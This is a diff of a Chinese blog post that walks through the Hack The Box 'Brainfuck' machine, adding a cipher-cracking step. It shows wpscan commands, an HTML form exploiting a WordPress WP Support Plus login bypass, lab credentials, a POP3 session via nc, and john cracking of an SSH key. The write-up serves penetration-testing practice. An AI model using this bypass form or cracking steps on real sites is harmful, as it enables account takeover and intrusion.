@@ -28,27 +28,29 @@
 <meta property="og:site_name" content="Love ❤ Hacking">
 <meta property="og:description" content="Brainfuck信息收集">
 <meta property="og:locale">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/1.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/2.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/3.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/4.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/5.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/6.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/7.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/8.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/9.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/10.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/11.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/12.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/13.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/14.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/15.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/1.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/2.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/3.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/4.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/5.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/6.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/7.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/8.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/9.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/10.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/11.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/12.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/13.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/16.png">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/17.png">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/14.jpg">
+<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/15.jpg">
 <meta property="article:published_time" content="2020-06-05T07:30:25.000Z">
-<meta property="article:modified_time" content="2020-06-05T10:37:59.837Z">
+<meta property="article:modified_time" content="2021-05-06T15:55:41.763Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://evilarsene.icu/images/brainfuck/1.jpg">
+<meta name="twitter:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/1.jpg">
 
 <link rel="canonical" href="http://evilarsene.icu/2020/06/05/HTB-Brainfuck/">
 
@@ -230,10 +232,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-06-05 15:30:25 / 修改时间：18:37:59" itemprop="dateCreated datePublished" datetime="2020-06-05T15:30:25+08:00">2020-06-05</time>
+              <time title="创建时间：2020-06-05 15:30:25" itemprop="dateCreated datePublished" datetime="2020-06-05T15:30:25+08:00">2020-06-05</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-06 23:55:41" itemprop="dateModified" datetime="2021-05-06T23:55:41+08:00">2021-05-06</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -255,53 +263,63 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/brainfuck/1.jpg" alt="1"></p>
+        <h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="../images/brainfuck/1.jpg" alt="1"></p>
 <h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>发现443端口运行了https服务，登录之后是一个nginx的欢迎页面<br>在/etc/hosts中添加ip</p>
-<p><img src="/images/brainfuck/2.jpg" alt="2"></p>
+<p><img src="../images/brainfuck/2.jpg" alt="2"></p>
 <p>之后就可以正常访问了</p>
-<p><img src="/images/brainfuck/3.jpg" alt="3"></p>
+<p><img src="../images/brainfuck/3.jpg" alt="3"></p>
 <p>这是一个wordpress站点</p>
 <h4 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h4><p>对wordpress进行扫描</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --api-token zBDf1JO6FsSNPZjosgaoPHKg8f049ar0FhEFDumlGjg --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; --disable-tls-checks</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/brainfuck/4.jpg" alt="4"></p>
+<p><img src="../images/brainfuck/4.jpg" alt="4"></p>
 <p>发现了wp support plus存在的漏洞</p>
 <p>接着对wordpress进行用户名枚举</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/brainfuck/5.jpg" alt="5"></p>
+<p><img src="../images/brainfuck/5.jpg" alt="5"></p>
 <p>发现了2个账号</p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p><img src="/images/brainfuck/6.jpg" alt="6"></p>
-<p><img src="/images/brainfuck/7.jpg" alt="7"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p><img src="../images/brainfuck/6.jpg" alt="6"></p>
+<p><img src="../images/brainfuck/7.jpg" alt="7"></p>
 <p>这个权限提升漏洞可以让你不知道秘密的情况下进行 登录，不过需要知道用户名</p>
 <p>我们在本地web服务创建HTML页面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;https:&#x2F;&#x2F;brainfuck.htb&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt;</span><br><span class="line">        Username: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;administrator&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;sth&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;loginGuestFacebook&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/brainfuck/8.jpg" alt="8"></p>
+<p><img src="../images/brainfuck/8.jpg" alt="8"></p>
 <p>等待一会儿</p>
-<p><img src="/images/brainfuck/9.jpg" alt="9"></p>
+<p><img src="../images/brainfuck/9.jpg" alt="9"></p>
 <p>这时候再回到主页</p>
-<p><img src="/images/brainfuck/10.jpg" alt="10"></p>
+<p><img src="../images/brainfuck/10.jpg" alt="10"></p>
 <p>发现我们已经获得了cookie成功登录了账号</p>
 <p>两个账号都没有对插件的写权限，不能写入shell，不过在admin账号下，发现了</p>
-<p><img src="/images/brainfuck/11.jpg" alt="11"></p>
+<p><img src="../images/brainfuck/11.jpg" alt="11"></p>
 <p>SMTP账号密码orestis/kHGuERB29DNiNE</p>
 <p>之后我就可以利用获取的账号和密码访问pop3服务</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~#nc -nv 10.10.10.17 110</span><br><span class="line">USER orestis</span><br><span class="line">PASS kHGuERB29DNiNE</span><br><span class="line">stat</span><br><span class="line">retr1</span><br><span class="line">retr2</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/brainfuck/12.jpg" alt="12"></p>
+<p><img src="../images/brainfuck/12.jpg" alt="12"></p>
 <p>在第二封邮件里发现了账号和密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: orestis</span><br><span class="line">password: kIEnnfEKJ#9UmdO</span><br></pre></td></tr></table></figure>
 
 <p>使用这个密码可以登录<code>https://sup3rs3cr3t.brainfuck.htb/</code></p>
-<p><img src="/images/brainfuck/13.jpg" alt="13"></p>
+<p><img src="../images/brainfuck/13.jpg" alt="13"></p>
+<p>在其中一个会话中发现了加密通讯信息</p>
+<p><img src="../images/brainfuck/16.png" alt="16"></p>
+<p>这里破解需要另一个论坛上的信息</p>
+<p><img src="../images/brainfuck/17.png" alt="17"></p>
+<p>可以猜到签名部分应该是相同的内容，但这里显示的字符串并不相同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Pieagnm - Jkoijeg nbw zwx mle grwsnn</span><br><span class="line">Wejmvse - Fbtkqal zqb rso rnl cwihsf</span><br><span class="line">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</span><br><span class="line">Orestis - Hacking for fun and profit</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/otp.php">http://rumkin.com/tools/cipher/otp.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正文O对应P	反应b</span><br><span class="line">正文r对应i	反应r</span><br></pre></td></tr></table></figure>
+
 <p>破解其中对话，获得URL<code>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</code></p>
 <p>下载<code>id_rsa</code>,还需要破解它</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;usr&#x2F;share&#x2F;john#python ssh2john.py &#x2F;root&#x2F;Desktop&#x2F;id_rsa &gt; &#x2F;root&#x2F;Desktop&#x2F;pass.txt</span><br><span class="line">root@kali:~&#x2F;Desktop#john pass.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt </span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/brainfuck/14.jpg" alt="14"></p>
+<p><img src="../images/brainfuck/14.jpg" alt="14"></p>
 <p>得出密钥:<code>3poulakia!</code></p>
-<p><img src="/images/brainfuck/15.jpg" alt="15"></p>
+<p><img src="../images/brainfuck/15.jpg" alt="15"></p>
 <p>之后就可以进行ssh连接获取shell</p>
 
     </div>
@@ -402,7 +420,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">144</span>
+          <span class="site-state-item-count">145</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
